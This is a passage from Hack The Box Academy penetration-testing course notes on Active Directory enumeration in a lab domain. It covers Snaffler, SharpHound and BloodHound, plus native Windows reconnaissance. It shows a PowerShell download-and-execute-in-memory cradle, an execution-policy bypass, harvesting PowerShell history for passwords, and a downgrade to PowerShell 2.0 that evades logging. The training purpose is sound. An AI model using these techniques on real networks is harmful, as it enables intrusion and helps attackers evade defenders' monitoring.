[File] {Red}<KeepExtExactRed|R|^\\.sqldump$|312B|3/31/2022 12:05:30 PM>(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\DenyRedo.sqldump) .sqldump\n2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\\.sqldump$|310B|3/31/2022 12:05:02 PM>(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\AddPublish.sqldump) .sqldump\n2022-03-31 12:17:19 -07:00 [Share] {Green}(\\\\ACADEMY-EA-FILE.INLANEFREIGHT.LOCAL\\WsusContent)\n2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\\.keychain$|295B|3/31/2022 12:08:42 PM>(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\SetStep.keychain) .keychain\n2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\\.tblk$|279B|3/31/2022 12:05:25 PM>(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\FindConnect.tblk) .tblk\n2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\\.psafe3$|301B|3/31/2022 12:09:33 PM>(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\GetUpdate.psafe3) .psafe3\n2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\\.keypair$|278B|3/31/2022 12:09:09 PM>(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Infosec\\UnprotectConvertTo.keypair) .keypair\n2022-03-31 12:17:19 -07:00 [File] {Black}<KeepExtExactBlack|R|^\\.tblk$|280B|3/31/2022 12:05:17 PM>(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\ExportJoin.tblk) .tblk\n2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\\.mdf$|305B|3/31/2022 12:09:27 PM>(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\FormatShow.mdf) .mdf\n2022-03-31 12:17:19 -07:00 [File] {Red}<KeepExtExactRed|R|^\\.mdf$|299B|3/31/2022 12:09:14 PM>(\\\\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL\\Department Shares\\IT\\Development\\LockConfirm.mdf) .mdf\n\n<SNIP>\n```\n\nWe may find passwords, SSH keys, configuration files, or other data that can be used to further our access. Snaffler color codes the output for us and provides us with a rundown of the file types found in the shares.\n\nNow that we have a wealth of data about the INLANEFREIGHT.LOCAL domain (and hopefully clear notes and log file output!), we need a way to correlate it and visualize it. Let's dive deeper into `BloodHound` and see how powerful this tool can be during any AD-focused security assessment.\n\n---\n\n### BloodHound\n\nAs discussed in the previous section, `Bloodhound` is an exceptional open-source tool that can identify attack paths within an AD environment by analyzing the relationships between objects. Both penetration testers and blue teamers can benefit from learning to use BloodHound to visualize relationships in the domain. When used correctly and coupled with custom Cipher queries, BloodHound may find high-impact, but difficult to discover, flaws that have been present in the domain for years.\n\nFirst, we must authenticate as a domain user from a Windows attack host positioned within the network (but not joined to the domain) or transfer the tool to a domain-joined host. There are many ways to achieve this covered in the [File Transfer](https://academy.hackthebox.com/course/preview/file-transfers) module. For our purposes, we will work with SharpHound.exe already on the attack host, but it's worth experimenting with transferring the tool to the attack host from Pwnbox or our own VM using methods such as a Python HTTP server, smbserver.py from Impacket, etc.\n\nIf we run SharpHound with the `--help` option, we can see the options available to us.\n\n#### SharpHound in Action\n\nCredentialed Enumeration - from Windows\n\n```powershell-session\nPS C:\\htb>  .\\SharpHound.exe --help\n\nSharpHound 1.0.3\nCopyright (C) 2022 SpecterOps\n\n  -c, --collectionmethods    (Default: Default) Collection Methods: Container, Group, LocalGroup, GPOLocalGroup,\n                             Session, LoggedOn, ObjectProps, ACL, ComputerOnly, Trusts, Default, RDP, DCOM, DCOnly\n\n  -d, --domain               Specify domain to enumerate\n\n  -s, --searchforest         (Default: false) Search all available domains in the forest\n\n  --stealth                  Stealth Collection (Prefer DCOnly whenever possible!)\n\n  -f                         Add an LDAP filter to the pregenerated filter.\n\n  --distinguishedname        Base DistinguishedName to start the LDAP search at\n\n  --computerfile             Path to file containing computer names to enumerate\n  \n  <SNIP>\n```\n\nWe'll start by running the SharpHound.exe collector from the MS01 attack host.\n\nCredentialed Enumeration - from Windows\n\n```powershell-session\nPS C:\\htb> .\\SharpHound.exe -c All --zipfilename ILFREIGHT\n\n2022-04-18T13:58:22.1163680-07:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote\n2022-04-18T13:58:22.1163680-07:00|INFORMATION|Initializing SharpHound at 1:58 PM on 4/18/2022\n2022-04-18T13:58:22.6788709-07:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote\n2022-04-18T13:58:23.0851206-07:00|INFORMATION|Beginning LDAP search for INLANEFREIGHT.LOCAL\n2022-04-18T13:58:53.9132950-07:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 67 MB RAM\n2022-04-18T13:59:15.7882419-07:00|INFORMATION|Producer has finished, closing LDAP channel\n2022-04-18T13:59:16.1788930-07:00|INFORMATION|LDAP channel closed, waiting for consumers\n2022-04-18T13:59:23.9288698-07:00|INFORMATION|Status: 3793 objects finished (+3793 63.21667)/s -- Using 112 MB RAM\n2022-04-18T13:59:45.4132561-07:00|INFORMATION|Consumers finished, closing output channel\nClosing writers\n2022-04-18T13:59:45.4601086-07:00|INFORMATION|Output channel closed, waiting for output task to complete\n2022-04-18T13:59:45.8663528-07:00|INFORMATION|Status: 3809 objects finished (+16 46.45122)/s -- Using 110 MB RAM\n2022-04-18T13:59:45.8663528-07:00|INFORMATION|Enumeration finished in 00:01:22.7919186\n2022-04-18T13:59:46.3663660-07:00|INFORMATION|SharpHound Enumeration Completed at 1:59 PM on 4/18/2022! Happy Graphing\n```\n\nNext, we can exfiltrate the dataset to our own VM or ingest it into the BloodHound GUI tool on MS01. We can do this on MS01 by typing `bloodhound` into a CMD or PowerShell console. The credentials should be saved, but enter `neo4j: HTB_@cademy_stdnt!` if a prompt appears. Next, click on the `Upload Data` button on the right-hand side, select the newly generated zip file, and click `Open`. An `Upload Progress` window will pop up. Once all .json files show 100% complete, click the X at the top of that window.\n\nWe can start by typing `domain:` in the search bar on the top left and choosing `INLANEFREIGHT.LOCAL` from the results. Take a moment to browse the node info tab. As we can see, this would be a rather large company with over 550 hosts to target and trusts with two other domains.\n\nNow, let's check out a few pre-built queries in the `Analysis` tab. The query `Find Computers with Unsupported Operating Systems` is great for finding outdated and unsupported operating systems running legacy software. These systems are relatively common to find within enterprise networks (especially older environments), as they often run some product that cannot be updated or replaced as of yet. Keeping these hosts around may save money, but they also can add unnecessary vulnerabilities to the network. Older hosts may be susceptible to older remote code execution vulnerabilities like [MS08-067](https://support.microsoft.com/en-us/topic/ms08-067-vulnerability-in-server-service-could-allow-remote-code-execution-ac7878fc-be69-7143-472d-2507a179cd15). If we come across these older hosts during an assessment, we should be careful before attacking them (or even check with our client) as they may be fragile and running a critical application or service. We can advise our client to segment these hosts off from the rest of the network as much as possible if they cannot remove them yet, but should also recommend that they start putting together a plan to decommission and replace them.\n\nThis query shows two hosts, one running Windows 7 and one running Windows Server 2008 (both of which are not \"live\" in our lab). Sometimes we will see hosts that are no longer powered on but still appear as records in AD. We should always validate whether they are \"live\" or not before making recommendations in our reports. We may write up a high-risk finding for Legacy Operating Systems or a best practice recommendation for cleaning up old records in AD.\n\n#### Unsupported Operating Systems\n\n![BloodHound interface showing node info for ACADEMY-EA-WS01.INLANEFREIGHT.LOCAL with details like sessions, reachable targets, and node properties.](https://academy.hackthebox.com/storage/modules/143/unsupported.png)\n\nWe will often see users with local admin rights on their host (perhaps temporarily to install a piece of software, and the rights were never removed), or they occupy a high enough role in the organization to demand these rights (whether they require them or not). Other times we'll see excessive local admin rights handed out across the organization, such as multiple groups in the IT department with local admin over groups of servers or even the entire Domain Users group with local admin over one or more hosts. This can benefit us if we take over a user account with these rights over one or more machines. We can run the query `Find Computers where Domain Users are Local Admin` to quickly see if there are any hosts where all users have local admin rights. If this is the case, then any account we control can typically be used to access the host(s) in question, and we may be able to retrieve credentials from memory or find other sensitive data.\n\n#### Local Admins\n\n![BloodHound interface showing node info for DOMAIN USERS@INLANEFREIGHT.LOCAL with sessions, node properties, and connection to ACADEMY-EA-MS01.INLANEFREIGHT.LOCAL.](https://academy.hackthebox.com/storage/modules/143/local-admin.png)\n\nThis is just a snapshot of the useful queries we can run. As we continue through this module, you will see several more that can be helpful in finding other weaknesses in the domain. For a more in-depth study on BloodHound, check out the module [Active Directory Bloodhound](https://academy.hackthebox.com/course/preview/active-directory-bloodhound). Take some time and try out each of the queries in the `Analysis` tab to become more familiar with the tool. It's also worth experimenting with [custom Cypher queries](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/) by pasting them into the `Raw Query` box at the bottom of the screen.\n\nKeep in mind as we go through the engagement, we should be documenting every file that is transferred to and from hosts in the domain and where they were placed on disk. This is good practice if we have to deconflict our actions with the customer. Also, depending on the scope of the engagement, you want to ensure you cover your tracks and clean up anything you put in the environment at the conclusion of the engagement.\n\n---\n\nWe have a great picture of the domain's layout, strengths, and weaknesses. We have credentials for several users and have enumerated a wealth of information such as users, groups, computers, GPOs, ACLs, local admin rights, access rights (RDP, WinRM, etc.), accounts configured with Service Principal Names (SPNs), and more. We have detailed notes and a wealth of output and experimented with many different tools to practice enumerating AD with and without credentials from Linux and Windows attack hosts. What happens if we are restricted with the shell we have or do not have the ability to import tools? Our client may ask us to perform all work from a managed host inside their network without internet access and no way to load our tools. We could land on a host as `SYSTEM` after a successful attack, but be in a position where it is very difficult or not possible to load tools. What do we do then? In the next section, we will look at how to perform actions while \"Living Off The Land.\"",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/12-Active Directory Enumeration & Attacks/17-Living Off the Land",
    "path": "02_CPTS/12-Active Directory Enumeration & Attacks/17-Living Off the Land.md",
    "title": "17 Living Off The Land",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "--- Earlier in the module, we practiced several tools and techniques (both credentialed and uncredentialed) to enumerate the AD environment. These methods required us to upload or pull the tool onto t...",
    "category": "02_CPTS",
    "content": "\n---\n\nEarlier in the module, we practiced several tools and techniques (both credentialed and uncredentialed) to enumerate the AD environment. These methods required us to upload or pull the tool onto the foothold host or have an attack host inside the environment. This section will discuss several techniques for utilizing native Windows tools to perform our enumeration and then practice them from our Windows attack host.\n\n---\n\n## Scenario\n\nLet's assume our client has asked us to test their AD environment from a managed host with no internet access, and all efforts to load tools onto it have failed. Our client wants to see what types of enumeration are possible, so we'll have to resort to \"living off the land\" or only using tools and commands native to Windows/Active Directory. This can also be a more stealthy approach and may not create as many log entries and alerts as pulling tools into the network in previous sections. Most enterprise environments nowadays have some form of network monitoring and logging, including IDS/IPS, firewalls, and passive sensors and tools on top of their host-based defenses such as Windows Defender or enterprise EDR. Depending on the environment, they may also have tools that take a baseline of \"normal\" network traffic and look for anomalies. Because of this, our chances of getting caught go up exponentially when we start pulling tools into the environment from outside.\n\n---\n\n## Env Commands For Host & Network Recon\n\nFirst, we'll cover a few basic environmental commands that can be used to give us more information about the host we are on.\n\n#### Basic Enumeration Commands\n\n|**Command**|**Result**|\n|---|---|\n|`hostname`|Prints the PC's Name|\n|`[System.Environment]::OSVersion.Version`|Prints out the OS version and revision level|\n|`wmic qfe get Caption,Description,HotFixID,InstalledOn`|Prints the patches and hotfixes applied to the host|\n|`ipconfig /all`|Prints out network adapter state and configurations|\n|`set`|Displays a list of environment variables for the current session (ran from CMD-prompt)|\n|`echo %USERDOMAIN%`|Displays the domain name to which the host belongs (ran from CMD-prompt)|\n|`echo %logonserver%`|Prints out the name of the Domain controller the host checks in with (ran from CMD-prompt)|\n\n#### Basic Enumeration\n\n![GIF showcasing the commands in a PowerShell terminal from the table above.](https://academy.hackthebox.com/storage/modules/143/basic-enum.png)\n\nThe commands above will give us a quick initial picture of the state the host is in, as well as some basic networking and domain information. We can cover the information above with one command [systeminfo](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/systeminfo).\n\n#### Systeminfo\n\n![GIF showcasing the systeminfo command in a PowerShell terminal.](https://academy.hackthebox.com/storage/modules/143/systeminfo.png)\n\nThe `systeminfo` command, as seen above, will print a summary of the host's information for us in one tidy output. Running one command will generate fewer logs, meaning less of a chance we are noticed on the host by a defender.\n\n---\n\n## Harnessing PowerShell\n\nPowerShell has been around since 2006 and provides Windows sysadmins with an extensive framework for administering all facets of Windows systems and AD environments. It is a powerful scripting language and can be used to dig deep into systems. PowerShell has many built-in functions and modules we can use on an engagement to recon the host and network and send and receive files.\n\nLet's look at a few of the ways PowerShell can help us.\n\n|**Cmd-Let**|**Description**|\n|---|---|\n|`Get-Module`|Lists available modules loaded for use.|\n|`Get-ExecutionPolicy -List`|Will print the [execution policy](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-7.2) settings for each scope on a host.|\n|`Set-ExecutionPolicy Bypass -Scope Process`|This will change the policy for our current process using the `-Scope` parameter. Doing so will revert the policy once we vacate the process or terminate it. This is ideal because we won't be making a permanent change to the victim host.|\n|`Get-ChildItem Env: \\| ft Key,Value`|Return environment values such as key paths, users, computer information, etc.|\n|`Get-Content $env:APPDATA\\Microsoft\\Windows\\Powershell\\PSReadline\\ConsoleHost_history.txt`|With this string, we can get the specified user's PowerShell history. This can be quite helpful as the command history may contain passwords or point us towards configuration files or scripts that contain passwords.|\n|`powershell -nop -c \"iex(New-Object Net.WebClient).DownloadString('URL to download the file from'); <follow-on commands>\"`|This is a quick and easy way to download a file from the web using PowerShell and call it from memory.|\n\nLet's see them in action now on the `MS01` host.\n\n#### Quick Checks Using PowerShell\n\nLiving Off the Land\n\n```powershell-session\nPS C:\\htb> Get-Module\n\nModuleType Version    Name                                ExportedCommands\n---------- -------    ----                                ----------------\nManifest   1.0.1.0    ActiveDirectory                     {Add-ADCentralAccessPolicyMember, Add-ADComputerServiceAcc...\nManifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}\nScript     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PS...\n\nPS C:\\htb> Get-ExecutionPolicy -List\nGet-ExecutionPolicy -List\n\n        Scope ExecutionPolicy\n        ----- ---------------\nMachinePolicy       Undefined\n   UserPolicy       Undefined\n      Process       Undefined\n  CurrentUser       Undefined\n LocalMachine    RemoteSigned\n\n\nPS C:\\htb> whoami\nnt authority\\system\n\nPS C:\\htb> Get-ChildItem Env: | ft key,value\n\nGet-ChildItem Env: | ft key,value\n\nKey                     Value\n---                     -----\nALLUSERSPROFILE         C:\\ProgramData\nAPPDATA                 C:\\Windows\\system32\\config\\systemprofile\\AppData\\Roaming\nCommonProgramFiles      C:\\Program Files (x86)\\Common Files\nCommonProgramFiles(x86) C:\\Program Files (x86)\\Common Files\nCommonProgramW6432      C:\\Program Files\\Common Files\nCOMPUTERNAME            ACADEMY-EA-MS01\nComSpec                 C:\\Windows\\system32\\cmd.exe\nDriverData              C:\\Windows\\System32\\Drivers\\DriverData\nLOCALAPPDATA            C:\\Windows\\system32\\config\\systemprofile\\AppData\\Local\nNUMBER_OF_PROCESSORS    4\nOS                      Windows_NT\nPath                    C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShel...\nPATHEXT                 .COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL\nPROCESSOR_ARCHITECTURE  x86\nPROCESSOR_ARCHITEW6432  AMD64\nPROCESSOR_IDENTIFIER    AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD\nPROCESSOR_LEVEL         23\nPROCESSOR_REVISION      3100\nProgramData             C:\\ProgramData\nProgramFiles            C:\\Program Files (x86)\nProgramFiles(x86)       C:\\Program Files (x86)\nProgramW6432            C:\\Program Files\nPROMPT                  $P$G\nPSModulePath            C:\\Program Files\\WindowsPowerShell\\Modules;WindowsPowerShell\\Modules;C:\\Program Files (x86)\\...\nPUBLIC                  C:\\Users\\Public\nSystemDrive             C:\nSystemRoot              C:\\Windows\nTEMP                    C:\\Windows\\TEMP\nTMP                     C:\\Windows\\TEMP\nUSERDOMAIN              INLANEFREIGHT\nUSERNAME                ACADEMY-EA-MS01$\nUSERPROFILE             C:\\Windows\\system32\\config\\systemprofile\nwindir                  C:\\Windows\n```\n\nWe have performed basic enumeration of the host. Now, let's discuss a few operational security tactics.\n\nMany defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. This is a great way for us to remain under the defenders' radar while still utilizing resources built into the hosts to our advantage. Below is an example of downgrading Powershell.\n\n#### Downgrade Powershell\n\nLiving Off the Land\n\n```powershell-session\nPS C:\\htb> Get-host\n\nName             : ConsoleHost\nVersion          : 5.1.19041.1320\nInstanceId       : 18ee9fb4-ac42-4dfe-85b2-61687291bbfc\nUI               : System.Management.Automation.Internal.Host.InternalHostUserInterface\nCurrentCulture   : en-US\nCurrentUICulture : en-US\nPrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy\nDebuggerEnabled  : True\nIsRunspacePushed : False\nRunspace         : System.Management.Automation.Runspaces.LocalRunspace\n\nPS C:\\htb> powershell.exe -version 2\nWindows PowerShell\nCopyright (C) 2009 Microsoft Corporation. All rights reserved.\n\nPS C:\\htb> Get-host\nName             : ConsoleHost\nVersion          : 2.0\nInstanceId       : 121b807c-6daa-4691-85ef-998ac137e469\nUI               : System.Management.Automation.Internal.Host.InternalHostUserInterface\nCurrentCulture   : en-US\nCurrentUICulture : en-US\nPrivateData      : Microsoft.PowerShell.ConsoleHost+ConsoleColorProxy\nIsRunspacePushed : False\nRunspace         : System.Management.Automation.Runspaces.LocalRunspace\n\nPS C:\\htb> get-module\n\nModuleType Version    Name                                ExportedCommands\n---------- -------    ----                                ----------------\nScript     0.0        chocolateyProfile                   {TabExpansion, Update-SessionEnvironment, refreshenv}\nManifest   3.1.0.0    Microsoft.PowerShell.Management     {Add-Computer, Add-Content, Checkpoint-Computer, Clear-Content...}\nManifest   3.1.0.0    Microsoft.PowerShell.Utility        {Add-Member, Add-Type, Clear-Variable, Compare-Object...}\nScript     0.7.3.1    posh-git                            {Add-PoshGitToProfile, Add-SshKey, Enable-GitColors, Expand-GitCommand...}\nScript     2.0.0      PSReadline                          {Get-PSReadLineKeyHandler, Get-PSReadLineOption, Remove-PSReadLineKeyHandler...\n```\n\nWe can now see that we are running an older version of PowerShell from the output above. Notice the difference in the version reported. It validates we have successfully downgraded the shell. Let's check and see if we are still writing logs. The primary place to look is in the `PowerShell Operational Log` found under `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`. All commands executed in our session will log to this file. The `Windows PowerShell` log located at `Applications and Services Logs > Windows PowerShell` is also a good place to check. An entry will be made here when we start an instance of PowerShell. In the image below, we can see the red entries made to the log from the current PowerShell session and the output of the last entry made at 2:12 pm when the downgrade is performed. It was the last entry since our session moved into a version of PowerShell no longer capable of logging. Notice that, that event corresponds with the last event in the `Windows PowerShell` log entries.\n\n#### Examining the Powershell Event Log\n\n![Event Viewer showing PowerShell operational logs with Event 4104 details, including script block creation and execution time.](https://academy.hackthebox.com/storage/modules/143/downgrade.png)\n\nWith [Script Block Logging](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_logging_windows?view=powershell-7.2) enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly. Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0. Notice above in the logs that we can see the commands we issued during a normal shell session, but it stopped after starting a new PowerShell instance in version 2. Be aware that the action of issuing the command `powershell.exe -version 2` within the PowerShell session will be logged. So evidence will be left behind showing that the downgrade happened, and a suspicious or vigilant defender may start an investigation after seeing this happen and the logs no longer filling up for that instance. We can see an example of this in the image below. Items in the red box are the log entries before starting the new instance, and the info in green is the text showing a new PowerShell session was started in HostVersion 2.0.\n\n#### Starting V2 Logs\n\n![Event Viewer showing Windows PowerShell logs with Event 400 details, including ConsoleHost information and execution time.](https://academy.hackthebox.com/storage/modules/143/start-event.png)\n\n---\n\n### Checking Defenses\n\nThe next few commands utilize the [netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts) and [sc](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-query) utilities to help us get a feel for the state of the host when it comes to Windows Firewall settings and to check the status of Windows Defender.\n\n#### Firewall Checks\n\nLiving Off the Land\n\n```powershell-session\nPS C:\\htb> netsh advfirewall show allprofiles\n\nDomain Profile Settings:\n----------------------------------------------------------------------\nState                                 OFF\nFirewall Policy                       BlockInbound,AllowOutbound\nLocalFirewallRules                    N/A (GPO-store only)\nLocalConSecRules                      N/A (GPO-store only)\nInboundUserNotification               Disable\nRemoteManagement                      Disable\nUnicastResponseToMulticast            Enable\n\nLogging:\nLogAllowedConnections                 Disable\nLogDroppedConnections                 Disable\nFileName                              %systemroot%\\system32\\LogFiles\\Firewall\\pfirewall.log\nMaxFileSize                           4096\n\nPrivate Profile Settings:\n----------------------------------------------------------------------\nState                                 OFF\nFirewall Policy                       BlockInbound,AllowOutbound\nLocalFirewallRules                    N/A (GPO-store only)\nLocalConSecRules                      N/A (GPO-store only)\nInboundUserNotification               Disable\nRemoteManagement                      Disable\nUnicastResponseToMulticast            Enable\n\nLogging:\nLogAllowedConnections                 Disable\nLogDroppedConnections                 Disable\nFileName                              %systemroot%\\system32\\LogFiles\\Firewall\\pfirewall.log\nMaxFileSize                           4096\n\nPublic Profile Settings:\n----------------------------------------------------------------------\nState                                 OFF\nFirewall Policy                       BlockInbound,AllowOutbound\nLocalFirewallRules                    N/A (GPO-store only)\nLocalConSecRules                      N/A (GPO-store only)\nInboundUserNotification               Disable\nRemoteManagement                      Disable\nUnicastResponseToMulticast            Enable\n\nLogging:\nLogAllowedConnections                 Disable\nLogDroppedConnections                 Disable\nFileName                              %systemroot%\\system32\\LogFiles\\Firewall\\pfirewall.log\nMaxFileSize                           4096\n```\n\n#### Windows Defender Check (from CMD.exe)\n\nLiving Off the Land\n\n```cmd-session\nC:\\htb> sc query windefend\n\nSERVICE_NAME: windefend\n        TYPE               : 10  WIN32_OWN_PROCESS\n        STATE              : 4  RUNNING\n                                (STOPPABLE, NOT_PAUSABLE, ACCEPTS_SHUTDOWN)\n        WIN32_EXIT_CODE    : 0  (0x0)\n        SERVICE_EXIT_CODE  : 0  (0x0)\n        CHECKPOINT         : 0x0\n        WAIT_HINT          : 0x0\n```\n\nAbove, we checked if Defender was running. Below we will check the status and configuration settings with the [Get-MpComputerStatus](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpcomputerstatus?view=windowsserver2022-ps) cmdlet in PowerShell.\n\n#### Get-MpComputerStatus\n\nLiving Off the Land\n\n```powershell-session\nPS C:\\htb> Get-MpComputerStatus\n\nAMEngineVersion                  : 1.1.19000.8\nAMProductVersion                 : 4.18.2202.4\nAMRunningMode                    : Normal\nAMServiceEnabled                 : True\nAMServiceVersion                 : 4.18.2202.4\nAntispywareEnabled               : True\nAntispywareSignatureAge          : 0\nAntispywareSignatureLastUpdated  : 3/21/2022 4:06:15 AM\nAntispywareSignatureVersion      : 1.361.414.0\nAntivirusEnabled                 : True\nAntivirusSignatureAge            : 0\nAntivirusSignatureLastUpdated    : 3/21/2022 4:06:16 AM\nAntivirusSignatureVersion        : 1.361.414.0\nBehaviorMonitorEnabled           : True\nComputerID                       : FDA97E38-1666-4534-98D4-943A9A871482\nComputerState                    : 0\nDefenderSignaturesOutOfDate      : False\nDeviceControlDefaultEnforcement  : Unknown\nDeviceControlPoliciesLastUpdated : 3/20/2022 9:08:34 PM\nDeviceControlState               : Disabled\nFullScanAge                      : 4294967295\nFullScanEndTime                  :\nFullScanOverdue                  : False\nFullScanRequired                 : False\nFullScanSignatureVersion         :\nFullScanStartTime                :\nIoavProtectionEnabled            : True\nIsTamperProtected                : True\nIsVirtualMachine                 : False\nLastFullScanSource               : 0\nLastQuickScanSource              : 2\n\n<SNIP>\n```\n\nKnowing what revision our AV settings are at and what settings are enabled/disabled can greatly benefit us. We can tell how often scans are run, if the on-demand threat alerting is active, and more. This is also great info for reporting. Often defenders may think that certain settings are enabled or scans are scheduled to run at certain intervals. If that's not the case, these findings can help them remediate those issues.\n\n---\n\n## Am I Alone?\n\nWhen landing on a host for the first time, one important thing is to check and see if you are the only one logged in. If you start taking actions from a host someone else is on, there is the potential for them to notice you. If a popup window launches or a user is logged out of their session, they may report these actions or change their password, and we could lose our foothold.\n\n#### Using qwinsta\n\nLiving Off the Land\n\n```powershell-session\nPS C:\\htb> qwinsta\n\n SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE\n services                                    0  Disc\n>console           forend                    1  Active\n rdp-tcp                                 65536  Listen\n```\n\nNow that we have a solid feel for the state of our host, we can enumerate the network settings for our host and identify any potential domain machines or services we may want to target next.\n\n## Network Information\n\n|**Networking Commands**|**Description**|\n|---|---|\n|`arp -a`|Lists all known hosts stored in the arp table.|\n|`ipconfig /all`|Prints out adapter settings for the host. We can figure out the network segment from here.|\n|`route print`|Displays the routing table (IPv4 & IPv6) identifying known networks and layer three routes shared with the host.|\n|`netsh advfirewall show allprofiles`|Displays the status of the host's firewall. We can determine if it is active and filtering traffic.|\n\nCommands such as `ipconfig /all` and `systeminfo` show us some basic networking configurations. Two more important commands provide us with a ton of valuable data and could help us further our access. `arp -a` and `route print` will show us what hosts the box we are on is aware of and what networks are known to the host. Any networks that appear in the routing table are potential avenues for lateral movement because they are accessed enough that a route was added, or it has administratively been set there so that the host knows how to access resources on the domain. These two commands can be especially helpful in the discovery phase of a black box assessment where we have to limit our scanning\n\n#### Using arp -a\n\nLiving Off the Land\n\n```powershell-session\nPS C:\\htb> arp -a\n\nInterface: 172.16.5.25 --- 0x8\n  Internet Address      Physical Address      Type\n  172.16.5.5            00-50-56-b9-08-26     dynamic\n  172.16.5.130          00-50-56-b9-f0-e1     dynamic\n  172.16.5.240          00-50-56-b9-9d-66     dynamic\n  224.0.0.22            01-00-5e-00-00-16     static\n  224.0.0.251           01-00-5e-00-00-fb     static\n  224.0.0.252           01-00-5e-00-00-fc     static\n  239.255.255.250       01-00-5e-7f-ff-fa     static\n\nInterface: 10.129.201.234 --- 0xc\n  Internet Address      Physical Address      Type\n  10.129.0.1            00-50-56-b9-b9-fc     dynamic\n  10.129.202.29         00-50-56-b9-26-8d     dynamic\n  10.129.255.255        ff-ff-ff-ff-ff-ff     static\n  224.0.0.22            01-00-5e-00-00-16     static\n  224.0.0.251           01-00-5e-00-00-fb     static\n  224.0.0.252           01-00-5e-00-00-fc     static\n  239.255.255.250       01-00-5e-7f-ff-fa     static\n  255.255.255.255       ff-ff-ff-ff-ff-ff     static\n```\n\n#### Viewing the Routing Table\n\nLiving Off the Land\n\n```powershell-session\nPS C:\\htb> route print\n\n===========================================================================\nInterface List\n  8...00 50 56 b9 9d d9 ......vmxnet3 Ethernet Adapter #2\n 12...00 50 56 b9 de 92 ......vmxnet3 Ethernet Adapter\n  1...........................Software Loopback Interface 1\n===========================================================================\n\nIPv4 Route Table\n===========================================================================\nActive Routes:\nNetwork Destination        Netmask          Gateway       Interface  Metric\n          0.0.0.0          0.0.0.0       172.16.5.1      172.16.5.25    261\n          0.0.0.0          0.0.0.0       10.129.0.1   10.129.201.234     20\n       10.129.0.0      255.255.0.0         On-link    10.129.201.234    266\n   10.129.201.234  255.255.255.255         On-link    10.129.201.234    266\n   10.129.255.255  255.255.255.255         On-link    10.129.201.234    266\n        127.0.0.0        255.0.0.0         On-link         127.0.0.1    331\n        127.0.0.1  255.255.255.255         On-link         127.0.0.1    331\n  127.255.255.255  255.255.255.255         On-link         127.0.0.1    331\n       172.16.4.0    255.255.254.0         On-link       172.16.5.25    261\n      172.16.5.25  255.255.255.255         On-link       172.16.5.25    261\n     172.16.5.255  255.255.255.255         On-link       172.16.5.25    261\n        224.0.0.0        240.0.0.0         On-link         127.0.0.1    331\n        224.0.0.0        240.0.0.0         On-link    10.129.201.234    266\n        224.0.0.0        240.0.0.0         On-link       172.16.5.25    261\n  255.255.255.255  255.255.255.255         On-link         127.0.0.1    331\n  255.255.255.255  255.255.255.255         On-link    10.129.201.234    266\n  255.255.255.255  255.255.255.255         On-link       172.16.5.25    261\n  ===========================================================================\nPersistent Routes:\n  Network Address          Netmask  Gateway Address  Metric\n          0.0.0.0          0.0.0.0       172.16.5.1  Default\n===========================================================================\n\nIPv6 Route Table\n===========================================================================\n\n<SNIP>\n```\n\nUsing `arp -a` and `route print` will not only benefit in enumerating AD environments, but will also assist us in identifying opportunities to pivot to different network segments in any environment. These are commands we should consider using on each engagement to assist our clients in understanding where an attacker may attempt to go following initial compromise.\n\n---\n\n## Windows Management Instrumentation (WMI)\n\n[Windows Management Instrumentation (WMI)](https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi) is a scripting engine that is widely used within Windows enterprise environments to retrieve 